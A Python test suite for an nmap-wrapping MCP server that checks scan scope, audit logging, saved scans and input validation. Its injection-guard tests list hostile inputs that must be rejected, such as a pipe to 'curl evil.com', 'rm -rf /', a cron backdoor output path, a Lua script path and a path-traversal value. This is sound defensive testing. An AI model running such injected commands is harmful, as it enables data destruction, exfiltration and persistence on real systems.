#!/usr/bin/env python3
"""
nmap-mcp test suite — TDD approach.
Runs against localhost/loopback only (always in-scope).
Tests: scope enforcement, tool outputs, audit logging, scan persistence.

Usage: python3 -m pytest tests/ -v
   or: python3 tests/test_nmap_mcp.py
"""
import json
import os
import sys
import tempfile
import shutil
import unittest
from pathlib import Path
from unittest.mock import patch, MagicMock

# Add server dir to path
sys.path.insert(0, str(Path(__file__).parent.parent))

# Point config at a temp dir so tests don't pollute real scan storage
TEMP_DIR = None

def setUpModule():
    global TEMP_DIR
    TEMP_DIR = tempfile.mkdtemp(prefix="nmap_mcp_test_")

def tearDownModule():
    if TEMP_DIR:
        shutil.rmtree(TEMP_DIR, ignore_errors=True)


class TestScopeEnforcement(unittest.TestCase):
    """Scope enforcement must reject out-of-range targets and pass valid ones."""

    def setUp(self):
        import importlib
        # Re-import with test config
        import server
        importlib.reload(server)
        self.server = server

    def test_loopback_in_scope(self):
        """127.x.x.x must always be in scope."""
        self.assertTrue(self.server._in_scope("127.0.0.1"))
        self.assertTrue(self.server._in_scope("127.0.0.0/8"))

    def test_private_rfc1918_in_scope(self):
        """Configured RFC1918 ranges must be in scope."""
        # Default config allows 192.168.1.0/24, 10.0.0.0/8, 172.16.0.0/12
        self.assertTrue(self.server._in_scope("192.168.1.1"))
        self.assertTrue(self.server._in_scope("10.1.2.3"))
        self.assertTrue(self.server._in_scope("172.16.0.1"))

    def test_public_internet_out_of_scope(self):
        """Public IPs must be rejected."""
        self.assertFalse(self.server._in_scope("8.8.8.8"))
        self.assertFalse(self.server._in_scope("1.1.1.1"))
        self.assertFalse(self.server._in_scope("203.0.113.0/24"))

    def test_require_scope_raises_on_public(self):
        """_require_scope must raise ValueError for out-of-scope targets."""
        with self.assertRaises(ValueError) as ctx:
            self.server._require_scope("8.8.8.8", "test_tool")
        self.assertIn("outside the allowed scan scope", str(ctx.exception))

    def test_require_scope_passes_for_loopback(self):
        """_require_scope must not raise for in-scope targets."""
        try:
            self.server._require_scope("127.0.0.1", "test_tool")
        except ValueError:
            self.fail("_require_scope raised ValueError for loopback (should be in scope)")


class TestAuditLogging(unittest.TestCase):
    """Every tool call must produce an audit log entry."""

    def setUp(self):
        import server
        self.server = server
        # Fresh file per test to prevent bleed-through between test methods
        self._test_dir = tempfile.mkdtemp(prefix="nmap_audit_test_")
        self.audit_path = Path(self._test_dir) / "audit.log"
        self.server.AUDIT_LOG = self.audit_path

    def tearDown(self):
        shutil.rmtree(self._test_dir, ignore_errors=True)

    def test_audit_writes_entry(self):
        """_audit() must write a valid JSON line to the log file."""
        self.server._audit("test_tool", "127.0.0.1", {"ports": "22"}, "1 open", True)
        self.assertTrue(self.audit_path.exists())
        lines = self.audit_path.read_text().strip().splitlines()
        self.assertEqual(len(lines), 1)
        entry = json.loads(lines[0])
        self.assertEqual(entry["tool"], "test_tool")
        self.assertEqual(entry["target"], "127.0.0.1")
        self.assertTrue(entry["success"])
        self.assertIn("ts", entry)

    def test_audit_appends(self):
        """Multiple _audit() calls must append, not overwrite."""
        self.server._audit("tool_a", "127.0.0.1", {}, "ok", True)
        self.server._audit("tool_b", "127.0.0.2", {}, "ok", True)
        lines = self.audit_path.read_text().strip().splitlines()
        self.assertEqual(len(lines), 2)

    def test_audit_failed_scan_logged(self):
        """Failed scans must be logged with success=False."""
        self.server._audit("nmap_syn_scan", "8.8.8.8", {}, "REJECTED: out of scope", False)
        entry = json.loads(self.audit_path.read_text().strip())
        self.assertFalse(entry["success"])
        self.assertIn("REJECTED", entry["result_summary"])


class TestScanPersistence(unittest.TestCase):
    """Scan results must be saved to disk and retrievable by scan_id."""

    def setUp(self):
        import server
        self.server = server
        # Fresh scan dir per test to prevent file count bleed-through
        self._test_dir = tempfile.mkdtemp(prefix="nmap_persist_test_")
        self.server.SCAN_DIR = Path(self._test_dir) / "scans"
        self.server.SCAN_DIR.mkdir()

    def tearDown(self):
        shutil.rmtree(self._test_dir, ignore_errors=True)

    def test_save_scan_creates_file(self):
        """_save_scan must create a JSON file in SCAN_DIR."""
        scan_id = self.server._save_scan("nmap_ping_scan", "127.0.0.1", {"hosts": {}})
        files = list(self.server.SCAN_DIR.glob("*.json"))
        self.assertEqual(len(files), 1)
        self.assertIn(scan_id, files[0].name)

    def test_save_scan_file_valid_json(self):
        """Saved scan files must be valid JSON with required fields."""
        scan_id = self.server._save_scan("nmap_tcp_scan", "127.0.0.1", {"hosts": {"127.0.0.1": {}}})
        path = self.server.SCAN_DIR / f"{scan_id}.json"
        data = json.loads(path.read_text())
        self.assertEqual(data["scan_id"], scan_id)
        self.assertEqual(data["tool"], "nmap_tcp_scan")
        self.assertEqual(data["target"], "127.0.0.1")
        self.assertIn("timestamp", data)

    def test_get_scan_returns_data(self):
        """nmap_get_scan must return the saved JSON for a valid scan_id."""
        scan_id = self.server._save_scan("nmap_top_ports", "127.0.0.1", {"test": True})
        result = json.loads(self.server.nmap_get_scan(scan_id))
        self.assertEqual(result["scan_id"], scan_id)

    def test_get_scan_missing_returns_error(self):
        """nmap_get_scan must return an error dict for unknown scan_id."""
        result = json.loads(self.server.nmap_get_scan("nonexistent_scan_id"))
        self.assertIn("error", result)

    def test_get_scan_path_traversal_blocked(self):
        """nmap_get_scan must strip path traversal chars from scan_id."""
        result = json.loads(self.server.nmap_get_scan("../../etc/passwd"))
        self.assertIn("error", result)

    def test_list_scans_returns_records(self):
        """nmap_list_scans must return saved scan summaries."""
        self.server._save_scan("nmap_ping_scan", "127.0.0.1", {})
        self.server._save_scan("nmap_tcp_scan", "127.0.0.2", {})
        listing = json.loads(self.server.nmap_list_scans(limit=10))
        self.assertGreaterEqual(listing["count"], 2)
        self.assertTrue(all("scan_id" in s and "tool" in s for s in listing["scans"]))


class TestTargetValidation(unittest.TestCase):
    """_validate_target must reject malformed or injection-attempt targets."""

    def setUp(self):
        import server
        self.server = server

    def test_valid_ipv4_accepted(self):
        try:
            self.server._validate_target("192.168.1.1")
        except ValueError:
            self.fail("Valid IPv4 raised ValueError")

    def test_valid_cidr_accepted(self):
        try:
            self.server._validate_target("10.0.0.0/8")
        except ValueError:
            self.fail("Valid CIDR raised ValueError")

    def test_valid_hostname_accepted(self):
        try:
            self.server._validate_target("router.local")
        except ValueError:
            self.fail("Valid hostname raised ValueError")

    def test_space_in_target_rejected(self):
        """Space in target is an injection vector into python-nmap string formatting."""
        with self.assertRaises(ValueError):
            self.server._validate_target("192.168.1.1 --script evil")

    def test_semicolon_in_target_rejected(self):
        with self.assertRaises(ValueError):
            self.server._validate_target("192.168.1.1;id")

    def test_empty_target_rejected(self):
        with self.assertRaises(ValueError):
            self.server._validate_target("")

    def test_overlong_target_rejected(self):
        with self.assertRaises(ValueError):
            self.server._validate_target("a" * 256)


class TestCustomScanInjectionGuard(unittest.TestCase):
    """nmap_custom_scan must reject shell metacharacters and dangerous flags."""

    def setUp(self):
        import server
        self.server = server

    def test_semicolon_rejected(self):
        with self.assertRaises(ValueError):
            self.server.nmap_custom_scan("127.0.0.1", "-sT -p 22; rm -rf /")

    def test_pipe_rejected(self):
        with self.assertRaises(ValueError):
            self.server.nmap_custom_scan("127.0.0.1", "-sT | curl evil.com")

    def test_backtick_rejected(self):
        with self.assertRaises(ValueError):
            self.server.nmap_custom_scan("127.0.0.1", "-sT `whoami`")

    def test_dollar_rejected(self):
        with self.assertRaises(ValueError):
            self.server.nmap_custom_scan("127.0.0.1", "-sT -p $PORT")

    def test_output_flag_oN_rejected(self):
        """-oN writes to arbitrary path — must be blocked."""
        with self.assertRaises(ValueError):
            self.server.nmap_custom_scan("127.0.0.1", "-sT -oN /etc/cron.d/backdoor")

    def test_output_flag_oX_rejected(self):
        with self.assertRaises(ValueError):
            self.server.nmap_custom_scan("127.0.0.1", "-sT -oX /tmp/out.xml")

    def test_script_path_rejected(self):
        """--script with path is RCE via Lua — must be blocked."""
        with self.assertRaises(ValueError):
            self.server.nmap_custom_scan("127.0.0.1", "--script /tmp/evil.nse")

    def test_datadir_rejected(self):
        """--datadir loads attacker-controlled nmap data — must be blocked."""
        with self.assertRaises(ValueError):
            self.server.nmap_custom_scan("127.0.0.1", "--datadir /tmp/evil")

    def test_null_byte_rejected(self):
        with self.assertRaises(ValueError):
            self.server.nmap_custom_scan("127.0.0.1", "-sT\x00-p 22")

    def test_valid_flags_accepted(self):
        """Legit flags must not raise (actual scan may fail in unit test env, that's ok)."""
        try:
            self.server.nmap_custom_scan("127.0.0.1", "-sT -p 22 --open")
        except ValueError as e:
            self.fail(f"Valid flags raised ValueError: {e}")
        except Exception:
            pass  # nmap execution errors are fine in unit test context


class TestHostnameScopeResolution(unittest.TestCase):
    """Hostname targets must be resolved and all IPs validated against CIDR allowlist."""

    def setUp(self):
        import server
        self.server = server

    def test_localhost_hostname_in_scope(self):
        """'localhost' resolves to 127.0.0.1 which is in scope."""
        self.assertTrue(self.server._in_scope("localhost"))

    def test_public_hostname_out_of_scope(self):
        """A hostname resolving to a public IP must be rejected."""
        # Use a real hostname that resolves to a public IP
        # We mock socket to avoid network dependency
        import unittest.mock as mock
        with mock.patch("socket.getaddrinfo") as mock_dns:
            mock_dns.return_value = [(None, None, None, None, ("8.8.8.8", 0))]
            self.assertFalse(self.server._in_scope("google.com"))

    def test_unresolvable_hostname_rejected(self):
        """A hostname that fails DNS resolution must be rejected (fail closed)."""
        import unittest.mock as mock
        import socket
        with mock.patch("socket.getaddrinfo", side_effect=socket.gaierror("Name not found")):
            self.assertFalse(self.server._in_scope("does-not-exist.invalid"))


class TestPortSummaryHelper(unittest.TestCase):
    """_port_summary must correctly extract open ports from structured nmap output."""

    def setUp(self):
        import server
        self.server = server

    def _make_result(self, ports: dict) -> dict:
        """Build a minimal nmap result dict."""
        return {
            "hosts": {
                "127.0.0.1": {
                    "hostname": "localhost",
                    "state": "up",
                    "protocols": {"tcp": ports},
                    "os": [],
                }
            }
        }

    def test_open_ports_counted(self):
        result = self._make_result({
            22: {"state": "open", "name": "ssh", "product": "", "version": "", "extrainfo": "", "cpe": "", "reason": "", "script": {}},
            80: {"state": "open", "name": "http", "product": "", "version": "", "extrainfo": "", "cpe": "", "reason": "", "script": {}},
            443: {"state": "closed", "name": "https", "product": "", "version": "", "extrainfo": "", "cpe": "", "reason": "", "script": {}},
        })
        summary = self.server._port_summary(result)
        self.assertEqual(summary["total_open"], 2)

    def test_closed_ports_excluded(self):
        result = self._make_result({
            9999: {"state": "closed", "name": "", "product": "", "version": "", "extrainfo": "", "cpe": "", "reason": "", "script": {}},
        })
        summary = self.server._port_summary(result)
        self.assertEqual(summary["total_open"], 0)

    def test_per_host_structure(self):
        result = self._make_result({
            22: {"state": "open", "name": "ssh", "product": "OpenSSH", "version": "8.9", "extrainfo": "", "cpe": "", "reason": "", "script": {}},
        })
        summary = self.server._port_summary(result)
        self.assertIn("127.0.0.1", summary["per_host"])
        self.assertEqual(len(summary["per_host"]["127.0.0.1"]["open_ports"]), 1)
        self.assertEqual(summary["per_host"]["127.0.0.1"]["open_ports"][0]["service"], "ssh")


class TestLiveScans(unittest.TestCase):
    """
    Live integration tests — actually run nmap against localhost.
    These are slower but verify the full stack.
    Skip by setting SKIP_LIVE_TESTS=1 in environment.
    """

    def setUp(self):
        if os.environ.get("SKIP_LIVE_TESTS"):
            self.skipTest("SKIP_LIVE_TESTS set")
        import server
        self.server = server
        self.server.SCAN_DIR = Path(TEMP_DIR) / "live_scans"
        self.server.SCAN_DIR.mkdir(exist_ok=True)
        self.server.AUDIT_LOG = Path(TEMP_DIR) / "live_audit.log"

    def test_ping_scan_finds_localhost(self):
        """Ping scan against 127.0.0.1 must return it as up."""
        raw = self.server.nmap_ping_scan("127.0.0.1")
        result = json.loads(raw)
        self.assertIn("scan_id", result)
        self.assertGreaterEqual(result["count"], 1)
        ips = [h["ip"] for h in result["hosts_up"]]
        self.assertIn("127.0.0.1", ips)

    def test_tcp_scan_finds_ssh(self):
        """TCP scan of localhost port 22 must show SSH as open."""
        raw = self.server.nmap_tcp_scan("127.0.0.1", ports="22")
        result = json.loads(raw)
        self.assertIn("scan_id", result)
        open_ports = result.get("all_open_ports", [])
        ports_found = [p["port"] for p in open_ports]
        self.assertIn(22, ports_found)

    def test_top_ports_returns_structure(self):
        """Top ports scan must return valid structured output."""
        raw = self.server.nmap_top_ports("127.0.0.1", count=20)
        result = json.loads(raw)
        self.assertIn("scan_id", result)
        self.assertIn("per_host", result)
        self.assertIn("total_open", result)

    def test_syn_scan_finds_ssh(self):
        """SYN scan of localhost port 22 must work with cap_net_raw."""
        raw = self.server.nmap_syn_scan("127.0.0.1", ports="22")
        result = json.loads(raw)
        self.assertIn("scan_id", result)
        # If cap_net_raw is not set, nmap will error — that's a valid test failure signal
        self.assertNotIn("error", result.get("per_host", {}).get("127.0.0.1", {}))

    def test_scan_persisted_after_run(self):
        """A completed scan must appear in nmap_list_scans."""
        raw = self.server.nmap_tcp_scan("127.0.0.1", ports="22")
        result = json.loads(raw)
        scan_id = result["scan_id"]

        listing = json.loads(self.server.nmap_list_scans(limit=10))
        ids = [s["scan_id"] for s in listing["scans"]]
        self.assertIn(scan_id, ids)

    def test_out_of_scope_rejected_during_live_call(self):
        """A live call targeting a public IP must be rejected by scope enforcement."""
        with self.assertRaises(ValueError):
            self.server.nmap_ping_scan("8.8.8.8")


if __name__ == "__main__":
    unittest.main(verbosity=2)
